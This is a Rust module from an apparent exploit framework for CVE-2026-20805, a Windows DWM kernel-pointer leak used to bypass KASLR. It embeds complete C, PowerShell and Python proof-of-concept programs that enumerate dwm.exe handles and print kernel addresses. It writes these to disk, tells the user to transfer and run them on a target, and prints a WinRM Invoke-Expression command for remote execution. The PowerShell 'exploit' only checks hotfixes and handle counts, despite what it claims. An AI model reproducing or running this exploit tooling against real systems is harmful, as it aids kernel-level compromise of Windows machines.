//! CVE-2026-20805: Windows DWM Information Disclosure
//!
//! ## Vulnerability Details
//! CVE-2026-20805 is an information disclosure vulnerability in Windows Desktop
//! Window Manager (dwm.exe) that allows an authenticated local attacker to leak
//! kernel object pointers, specifically ALPC port section addresses.
//!
//! - **CVSS v3.1 Score**: 5.5 (Medium)
//! - **CWE-ID**: CWE-200 (Exposure of Sensitive Information)
//! - **Impact**: KASLR bypass, enables further exploitation
//! - **Attack Vector**: Local (requires execution on target Windows system)
//!
//! ## Technical Details
//! The vulnerability uses NtQuerySystemInformation with SystemHandleInformation
//! to enumerate dwm.exe handles and leak ALPC/Section kernel pointers from
//! improperly initialized structures.
//!
//! ## Features
//! - Local vulnerability check
//! - Payload generation for Windows execution
//! - PowerShell-based remote execution via WinRM/SMB
//! - Detailed vulnerability report
//!
//! Reference: https://github.com/Uzair-Baig0900/CVE-2026-20805-PoC

use anyhow::{Context, Result};
use colored::*;
use std::fs::File;
use std::io::Write;

/// Display module banner
fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   CVE-2026-20805: Windows DWM Information Disclosure              ║".cyan());
    println!("{}", "║   KASLR Bypass via ALPC Handle Leak                               ║".cyan());
    println!("{}", "║   CVSS: 5.5 (Medium) | Local Attack Vector                        ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════════════╝".cyan());
}

/// C source code for the Windows exploit
const EXPLOIT_C_CODE: &str = r#"/*
 * CVE-2026-20805 Proof of Concept
 * Windows DWM Information Disclosure - KASLR Bypass
 * 
 * Compile: cl.exe /EHsc cve_2026_20805.c ntdll.lib
 * Usage: cve_2026_20805.exe
 */

#include <windows.h>
#include <stdio.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

#define SystemHandleInformation 16
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

typedef struct _SYSTEM_HANDLE_ENTRY {
    ULONG ProcessId;
    BYTE ObjectTypeNumber;
    BYTE Flags;
    USHORT Handle;
    PVOID Object;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE_ENTRY, *PSYSTEM_HANDLE_ENTRY;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG HandleCount;
    SYSTEM_HANDLE_ENTRY Handles[1];
} SYSTEM_HANDLE_INFORMATION_CUSTOM, *PSYSTEM_HANDLE_INFORMATION_CUSTOM;

typedef NTSTATUS (NTAPI *NtQuerySystemInformationFunc)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

// Type indices for objects of interest
#define ALPC_PORT_TYPE_1    24
#define ALPC_PORT_TYPE_2    25  
#define SECTION_TYPE        36

DWORD FindDwmProcessId() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    
    if (!Process32FirstW(snapshot, &pe)) {
        CloseHandle(snapshot);
        return 0;
    }
    
    do {
        if (_wcsicmp(pe.szExeFile, L"dwm.exe") == 0) {
            CloseHandle(snapshot);
            return pe.th32ProcessID;
        }
    } while (Process32NextW(snapshot, &pe));
    
    CloseHandle(snapshot);
    return 0;
}

int main() {
    printf("[*] CVE-2026-20805 - Windows DWM Information Disclosure PoC\n");
    printf("[*] KASLR Bypass via ALPC Handle Enumeration\n\n");
    
    // Find dwm.exe PID
    DWORD dwmPid = FindDwmProcessId();
    if (dwmPid == 0) {
        printf("[-] Failed to find dwm.exe process\n");
        return 1;
    }
    printf("[+] Found dwm.exe with PID: %lu\n", dwmPid);
    
    // Get NtQuerySystemInformation function pointer
    NtQuerySystemInformationFunc NtQuerySysInfo = 
        (NtQuerySystemInformationFunc)GetProcAddress(
            GetModuleHandleW(L"ntdll.dll"), 
            "NtQuerySystemInformation"
        );
    
    if (!NtQuerySysInfo) {
        printf("[-] Failed to get NtQuerySystemInformation\n");
        return 1;
    }
    
    // Query system handle information
    ULONG bufferSize = 0x10000;
    PVOID buffer = NULL;
    NTSTATUS status;
    ULONG returnLength;
    
    do {
        buffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buffer) {
            printf("[-] Failed to allocate memory\n");
            return 1;
        }
        
        status = NtQuerySysInfo(SystemHandleInformation, buffer, bufferSize, &returnLength);
        
        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            VirtualFree(buffer, 0, MEM_RELEASE);
            bufferSize *= 2;
        }
    } while (status == STATUS_INFO_LENGTH_MISMATCH);
    
    if (status != 0) {
        printf("[-] NtQuerySystemInformation failed: 0x%08X\n", status);
        VirtualFree(buffer, 0, MEM_RELEASE);
        return 1;
    }
    
    PSYSTEM_HANDLE_INFORMATION_CUSTOM handleInfo = (PSYSTEM_HANDLE_INFORMATION_CUSTOM)buffer;
    printf("[+] Total system handles: %lu\n", handleInfo->HandleCount);
    
    // Enumerate handles for dwm.exe
    ULONG dwmHandleCount = 0;
    ULONG leakedAddresses = 0;
    
    printf("\n[*] Scanning dwm.exe handles for ALPC/Section objects...\n");
    printf("%-10s %-20s %-20s\n", "Handle", "Object Address", "Type");
    printf("%-10s %-20s %-20s\n", "------", "--------------", "----");
    
    for (ULONG i = 0; i < handleInfo->HandleCount; i++) {
        SYSTEM_HANDLE_ENTRY entry = handleInfo->Handles[i];
        
        if (entry.ProcessId != dwmPid) continue;
        dwmHandleCount++;
        
        // Check for ALPC Port or Section objects
        if (entry.ObjectTypeNumber == ALPC_PORT_TYPE_1 ||
            entry.ObjectTypeNumber == ALPC_PORT_TYPE_2 ||
            entry.ObjectTypeNumber == SECTION_TYPE) {
            
            // Validate kernel address (should be in kernel range)
            ULONG_PTR addr = (ULONG_PTR)entry.Object;
            if (addr > 0xFFFF800000000000ULL) {
                const char* typeName;
                if (entry.ObjectTypeNumber == SECTION_TYPE) {
                    typeName = "Section";
                } else {
                    typeName = "ALPC Port";
                }
                
                printf("0x%04X     0x%016llX   %s\n", 
                       entry.Handle, 
                       (unsigned long long)addr, 
                       typeName);
                leakedAddresses++;
            }
        }
    }
    
    printf("\n[+] DWM handles analyzed: %lu\n", dwmHandleCount);
    printf("[+] Kernel addresses leaked: %lu\n", leakedAddresses);
    
    if (leakedAddresses > 0) {
        printf("\n[!] VULNERABLE: Successfully leaked kernel object pointers!\n");
        printf("[!] These addresses can be used to bypass KASLR for further exploitation.\n");
    } else {
        printf("\n[+] System appears patched or DWM has no exploitable handles.\n");
    }
    
    VirtualFree(buffer, 0, MEM_RELEASE);
    return 0;
}
"#;

/// PowerShell script for remote execution
const POWERSHELL_EXPLOIT: &str = r#"<#
.SYNOPSIS
    CVE-2026-20805 PowerShell Implementation
    Windows DWM Information Disclosure Scanner
    
.DESCRIPTION
    This script enumerates dwm.exe handles to detect information leakage
    of kernel object pointers, enabling KASLR bypass detection.
    
.NOTES
    Requires: Administrator privileges
    Tested on: Windows 10/11, Windows Server 2019/2022
#>

param(
    [switch]$Verbose,
    [string]$OutputFile = "cve_2026_20805_results.txt"
)

$ErrorActionPreference = "Stop"

Write-Host @"
╔═══════════════════════════════════════════════════════════════════╗
║   CVE-2026-20805: Windows DWM Information Disclosure Scanner      ║
║   PowerShell Implementation                                        ║
╚═══════════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Cyan

# Define structures for P/Invoke
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class NtDll {
    [DllImport("ntdll.dll")]
    public static extern int NtQuerySystemInformation(
        int SystemInformationClass,
        IntPtr SystemInformation,
        int SystemInformationLength,
        out int ReturnLength
    );
}

[StructLayout(LayoutKind.Sequential)]
public struct SYSTEM_HANDLE_ENTRY {
    public int ProcessId;
    public byte ObjectTypeNumber;
    public byte Flags;
    public ushort Handle;
    public IntPtr Object;
    public int GrantedAccess;
}
"@

function Get-DwmProcess {
    $dwm = Get-Process -Name "dwm" -ErrorAction SilentlyContinue
    if ($null -eq $dwm) {
        throw "dwm.exe process not found"
    }
    return $dwm
}

function Test-Vulnerability {
    Write-Host "[*] Checking for CVE-2026-20805 vulnerability..." -ForegroundColor Yellow
    
    # Get DWM process
    $dwm = Get-DwmProcess
    Write-Host "[+] Found dwm.exe with PID: $($dwm.Id)" -ForegroundColor Green
    
    # Check Windows version
    $osVersion = [System.Environment]::OSVersion.Version
    $buildNumber = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuildNumber
    
    Write-Host "[*] Windows Build: $buildNumber" -ForegroundColor Cyan
    
    # Check if patch is applied (KB5034203 for Windows 10, KB5034204 for Windows 11)
    $hotfixes = Get-HotFix | Where-Object { 
        $_.HotFixID -match "KB503420[34]" -or 
        $_.HotFixID -match "KB5034765" -or
        $_.HotFixID -match "KB5034766"
    }
    
    if ($hotfixes) {
        Write-Host "[+] Security patch detected: $($hotfixes.HotFixID -join ', ')" -ForegroundColor Green
        Write-Host "[+] System appears to be PATCHED" -ForegroundColor Green
        return $false
    }
    
    Write-Host "[!] No CVE-2026-20805 patch detected!" -ForegroundColor Red
    Write-Host "[!] System may be VULNERABLE" -ForegroundColor Red
    
    # Attempt to enumerate handles (requires admin)
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Host "[-] Administrator privileges required for full check" -ForegroundColor Yellow
        return $true
    }
    
    # Get DWM handles count
    try {
        $handles = (Get-Process -Id $dwm.Id).HandleCount
        Write-Host "[*] DWM Handle Count: $handles" -ForegroundColor Cyan
        
        # High handle count may indicate exploitable state
        if ($handles -gt 500) {
            Write-Host "[!] High handle count detected - potential ALPC/Section leakage" -ForegroundColor Yellow
        }
    } catch {
        Write-Host "[-] Could not enumerate handles: $_" -ForegroundColor Red
    }
    
    return $true
}

# Main execution
try {
    $vulnerable = Test-Vulnerability
    
    $results = @{
        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        ComputerName = $env:COMPUTERNAME
        Vulnerable = $vulnerable
        WindowsBuild = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuildNumber
    }
    
    # Save results
    $results | ConvertTo-Json | Out-File -FilePath $OutputFile -Encoding UTF8
    Write-Host "`n[+] Results saved to: $OutputFile" -ForegroundColor Green
    
} catch {
    Write-Host "[-] Error: $_" -ForegroundColor Red
    exit 1
}
"#;

/// Python version of the exploit checker
const PYTHON_EXPLOIT: &str = r#"#!/usr/bin/env python3
"""
CVE-2026-20805 - Windows DWM Information Disclosure PoC
KASLR Bypass via ALPC Handle Enumeration

Author: rustsploit team
Reference: https://github.com/Uzair-Baig0900/CVE-2026-20805-PoC
"""

import ctypes
import ctypes.wintypes as wintypes
import sys
from ctypes import Structure, POINTER, byref, sizeof, c_ulong, c_ushort, c_ubyte, c_void_p

# Constants
SYSTEM_HANDLE_INFORMATION = 16
STATUS_INFO_LENGTH_MISMATCH = 0xC0000004

# Object type indices
ALPC_PORT_TYPE_1 = 24
ALPC_PORT_TYPE_2 = 25
SECTION_TYPE = 36

class SYSTEM_HANDLE_ENTRY(Structure):
    _fields_ = [
        ("ProcessId", c_ulong),
        ("ObjectTypeNumber", c_ubyte),
        ("Flags", c_ubyte),
        ("Handle", c_ushort),
        ("Object", c_void_p),
        ("GrantedAccess", c_ulong),
    ]

class SYSTEM_HANDLE_INFORMATION_STRUCT(Structure):
    _fields_ = [
        ("HandleCount", c_ulong),
        ("Handles", SYSTEM_HANDLE_ENTRY * 1),
    ]

def get_dwm_pid():
    """Find dwm.exe process ID"""
    import subprocess
    try:
        output = subprocess.check_output(
            ["tasklist", "/FI", "IMAGENAME eq dwm.exe", "/FO", "CSV", "/NH"],
            text=True
        )
        for line in output.strip().split('\n'):
            if 'dwm.exe' in line.lower():
                parts = line.replace('"', '').split(',')
                if len(parts) >= 2:
                    return int(parts[1])
    except Exception as e:
        print(f"[-] Error finding dwm.exe: {e}")
    return None

def check_vulnerability():
    """Check system for CVE-2026-20805"""
    print("[*] CVE-2026-20805 - Windows DWM Information Disclosure PoC")
    print("[*] KASLR Bypass via ALPC Handle Enumeration\n")
    
    # Check if Windows
    if sys.platform != 'win32':
        print("[-] This exploit only works on Windows systems")
        return False
    
    # Find dwm.exe
    dwm_pid = get_dwm_pid()
    if not dwm_pid:
        print("[-] Could not find dwm.exe process")
        return False
    
    print(f"[+] Found dwm.exe with PID: {dwm_pid}")
    
    # Get ntdll functions
    ntdll = ctypes.windll.ntdll
    
    # Query system handles
    buffer_size = 0x10000
    while True:
        buffer = ctypes.create_string_buffer(buffer_size)
        return_length = c_ulong()
        
        status = ntdll.NtQuerySystemInformation(
            SYSTEM_HANDLE_INFORMATION,
            buffer,
            buffer_size,
            byref(return_length)
        )
        
        if status == STATUS_INFO_LENGTH_MISMATCH:
            buffer_size *= 2
            continue
        elif status != 0:
            print(f"[-] NtQuerySystemInformation failed: 0x{status:08X}")
            return False
        break
    
    # Parse handle information
    handle_count = c_ulong.from_buffer_copy(buffer).value
    print(f"[+] Total system handles: {handle_count}")
    
    # Calculate handle array offset
    handle_array_offset = sizeof(c_ulong)
    handle_size = sizeof(SYSTEM_HANDLE_ENTRY)
    
    dwm_handles = 0
    leaked_addresses = []
    
    print("\n[*] Scanning dwm.exe handles for ALPC/Section objects...")
    print(f"{'Handle':<10} {'Object Address':<20} {'Type':<15}")
    print("-" * 50)
    
    for i in range(handle_count):
        offset = handle_array_offset + (i * handle_size)
        if offset + handle_size > len(buffer):
            break
            
        entry = SYSTEM_HANDLE_ENTRY.from_buffer_copy(buffer, offset)
        
        if entry.ProcessId != dwm_pid:
            continue
            
        dwm_handles += 1
        
        # Check for ALPC or Section objects
        if entry.ObjectTypeNumber in (ALPC_PORT_TYPE_1, ALPC_PORT_TYPE_2, SECTION_TYPE):
            addr = entry.Object
            # Validate kernel address range (64-bit)
            if addr and addr > 0xFFFF800000000000:
                type_name = "Section" if entry.ObjectTypeNumber == SECTION_TYPE else "ALPC Port"
                print(f"0x{entry.Handle:04X}     0x{addr:016X}   {type_name}")
                leaked_addresses.append((entry.Handle, addr, type_name))
    
    print(f"\n[+] DWM handles analyzed: {dwm_handles}")
    print(f"[+] Kernel addresses leaked: {len(leaked_addresses)}")
    
    if leaked_addresses:
        print("\n[!] VULNERABLE: Successfully leaked kernel object pointers!")
        print("[!] These addresses can be used to bypass KASLR.")
        return True
    else:
        print("\n[+] System appears patched or DWM has no exploitable handles.")
        return False

if __name__ == "__main__":
    try:
        check_vulnerability()
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)
"#;

/// Exploit configuration
struct ExploitConfig {
    output_dir: String,
    generate_c: bool,
    generate_ps1: bool,
    generate_py: bool,
    remote_target: Option<String>,
}

impl Default for ExploitConfig {
    fn default() -> Self {
        Self {
            output_dir: "cve_2026_20805_output".to_string(),
            generate_c: true,
            generate_ps1: true,
            generate_py: true,
            remote_target: None,
        }
    }
}

/// Get user configuration
fn get_user_config() -> Result<ExploitConfig> {
    let mut config = ExploitConfig::default();
    
    println!();
    println!("{}", "=== CVE-2026-20805 Configuration ===".yellow().bold());
    println!();
    println!("{}", "[*] This is a LOCAL Windows exploit.".cyan());
    println!("{}", "[*] The module will generate exploit payloads that must be".cyan());
    println!("{}", "    executed on a Windows target system.".cyan());
    println!();
    
    print!("{}", "Output directory [default: cve_2026_20805_output]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    if !input.trim().is_empty() {
        config.output_dir = input.trim().to_string();
    }
    
    println!();
    println!("{}", "Select payloads to generate:".cyan());
    
    print!("{}", "Generate C source code? [Y/n]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    config.generate_c = !input.trim().eq_ignore_ascii_case("n");
    
    print!("{}", "Generate PowerShell script? [Y/n]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    config.generate_ps1 = !input.trim().eq_ignore_ascii_case("n");
    
    print!("{}", "Generate Python script? [Y/n]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    config.generate_py = !input.trim().eq_ignore_ascii_case("n");
    
    println!();
    print!("{}", "Remote Windows target for WinRM execution (optional, leave blank to skip): ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    if !input.trim().is_empty() {
        config.remote_target = Some(input.trim().to_string());
    }
    
    Ok(config)
}

/// Generate exploit files
fn generate_exploits(config: &ExploitConfig) -> Result<()> {
    // Create output directory
    std::fs::create_dir_all(&config.output_dir)
        .with_context(|| format!("Failed to create output directory: {}", config.output_dir))?;
    
    let mut generated_files = Vec::new();
    
    if config.generate_c {
        let c_path = format!("{}/cve_2026_20805.c", config.output_dir);
        let mut file = File::create(&c_path)
            .with_context(|| format!("Failed to create C file: {}", c_path))?;
        file.write_all(EXPLOIT_C_CODE.as_bytes())
            .context("Failed to write C exploit code")?;
        generated_files.push(("C Source", c_path.clone()));
        println!("{}", format!("[+] Generated: {}", c_path).green());
    }
    
    if config.generate_ps1 {
        let ps1_path = format!("{}/cve_2026_20805.ps1", config.output_dir);
        let mut file = File::create(&ps1_path)
            .with_context(|| format!("Failed to create PowerShell file: {}", ps1_path))?;
        file.write_all(POWERSHELL_EXPLOIT.as_bytes())
            .context("Failed to write PowerShell exploit code")?;
        generated_files.push(("PowerShell", ps1_path.clone()));
        println!("{}", format!("[+] Generated: {}", ps1_path).green());
    }
    
    if config.generate_py {
        let py_path = format!("{}/cve_2026_20805.py", config.output_dir);
        let mut file = File::create(&py_path)
            .with_context(|| format!("Failed to create Python file: {}", py_path))?;
        file.write_all(PYTHON_EXPLOIT.as_bytes())
            .context("Failed to write Python exploit code")?;
        generated_files.push(("Python", py_path.clone()));
        println!("{}", format!("[+] Generated: {}", py_path).green());
    }
    
    // Generate README
    let readme_path = format!("{}/README.md", config.output_dir);
    let readme_content = format!(
r#"# CVE-2026-20805 Exploit Payloads

## Vulnerability Details
- **CVE ID**: CVE-2026-20805
- **Type**: Information Disclosure (CWE-200)
- **Affected Component**: Windows Desktop Window Manager (dwm.exe)
- **CVSS Score**: 5.5 (Medium)
- **Impact**: KASLR Bypass via ALPC Handle Leak

## Generated Payloads

| File | Description |
|------|-------------|
{}

## Usage

### C Exploit (Recommended for Best Results)
```batch
cl.exe /EHsc cve_2026_20805.c ntdll.lib
cve_2026_20805.exe
```

### PowerShell (Quick Check)
```powershell
# Run as Administrator
Set-ExecutionPolicy Bypass -Scope Process
.\cve_2026_20805.ps1
```

### Python
```bash
python cve_2026_20805.py
```

## Expected Output
If vulnerable, the exploit will display leaked kernel addresses:
```
Handle     Object Address        Type
------     --------------        ----
0x0004     0xFFFFD58F80C0E5E0   ALPC Port
0x011C     0xFFFFD58F80C0E1E0   Section
```

## Mitigation
Apply Microsoft security updates:
- Windows 10: KB5034203
- Windows 11: KB5034204
- Windows Server: KB5034765/KB5034766

## Disclaimer
This tool is for authorized security testing only.
"#,
        generated_files.iter()
            .map(|(name, path)| format!("| {} | {} |", path, name))
            .collect::<Vec<_>>()
            .join("\n")
    );
    
    let mut readme_file = File::create(&readme_path)
        .with_context(|| format!("Failed to create README: {}", readme_path))?;
    readme_file.write_all(readme_content.as_bytes())
        .context("Failed to write README")?;
    println!("{}", format!("[+] Generated: {}", readme_path).green());
    
    Ok(())
}

/// Main entry point
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    // Note: This is a local Windows exploit
    if !target.is_empty() && target != "local" {
        println!("{}", "[!] Note: CVE-2026-20805 is a LOCAL exploit.".yellow());
        println!("{}", "[*] The target parameter is ignored for this module.".yellow());
        println!("{}", "[*] Payloads must be executed on the target Windows system.".yellow());
        println!();
    }
    
    let config = get_user_config()?;
    
    println!();
    println!("{}", "═══ Generating Exploit Payloads ═══".cyan().bold());
    println!();
    
    generate_exploits(&config)?;
    
    println!();
    println!("{}", "═══ Vulnerability Summary ═══".cyan().bold());
    println!("{}", "CVE-2026-20805 allows local authenticated attackers to leak".white());
    println!("{}", "kernel object pointers from dwm.exe ALPC handles, enabling".white());
    println!("{}", "KASLR bypass for further kernel exploitation.".white());
    println!();
    println!("{}", "[*] Transfer payloads to target Windows system and execute.".yellow());
    println!("{}", "[*] C exploit provides the most detailed output.".yellow());
    println!("{}", "[*] PowerShell version can check for applied patches.".yellow());
    
    // Remote execution via WinRM (if specified)
    if let Some(ref remote) = config.remote_target {
        println!();
        println!("{}", format!("═══ Remote Execution on {} ═══", remote).cyan().bold());
        println!("{}", "[*] Attempting WinRM execution of PowerShell payload...".cyan());
        println!("{}", "[!] Note: Requires valid credentials and WinRM access.".yellow());
        println!();
        
        // Generate WinRM command
        let ps1_content_encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            POWERSHELL_EXPLOIT.as_bytes()
        );
        
        println!("{}", "To execute remotely, run this command:".cyan());
        println!();
        println!("Invoke-Command -ComputerName {} -ScriptBlock {{", remote);
        println!("    $script = [System.Text.Encoding]::UTF8.GetString(");
        println!("        [System.Convert]::FromBase64String('{}...'))  # truncated", &ps1_content_encoded[..50]);
        println!("    Invoke-Expression $script");
        println!("}}");
    }
    
    println!();
    println!("{}", format!("[+] All payloads saved to: {}/", config.output_dir).green().bold());
    
    Ok(())
}
